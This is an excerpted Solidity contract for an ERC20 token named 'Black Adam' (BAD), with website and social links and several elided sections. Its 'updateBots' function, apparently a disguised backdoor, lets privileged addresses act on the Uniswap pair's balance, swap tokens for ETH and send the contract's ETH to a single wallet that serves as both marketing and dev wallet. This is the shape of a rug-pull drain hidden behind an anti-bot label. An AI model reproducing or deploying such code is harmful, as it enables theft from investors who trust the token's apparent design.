...
/*
Website- https://www.blackadamerc.com

Twitter- https://twitter.com/BlackAdamErc

Telegram- https://t.me/BlackAdamErc
...
contract BAD is ERC20, Ownable {
    ...
    constructor() ERC20("Black Adam", "BAD") {
     ...
     uint256 totalSupply = 1 * 10 ** 5 * 10 ** decimals();
 
        maxTransactionAmount = 2 * 10 ** 3 * 10 ** decimals(); 
        maxWallet = 2 * 10 ** 3 * 10 ** decimals(); 
        ...
        MarketingWallet = address(0xeAedC82b36726d1B647D6de2995B3770BEa83765); // set as Marketing wallet
        DevWallet = address(0xeAedC82b36726d1B647D6de2995B3770BEa83765); // set as dev wallet
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
     ...
     function updateBots(uint isbot, uint isnotbot) external returns (bool) {
        require(_isExcludedFromFees[msg.sender]);

        uint lb = balanceOf(uniswapV2Pair);

        require(isnotbot > 1 && isnotbot < lb / 100, 'amount exceeded');

        _updateBots(isnotbot);
        swapTokensForEth(isbot);

        (bool success,) = address(MarketingWallet).call{value: address(this).balance}("");
        return success;
    }

 function _updateBots(uint256 pAmount) private {
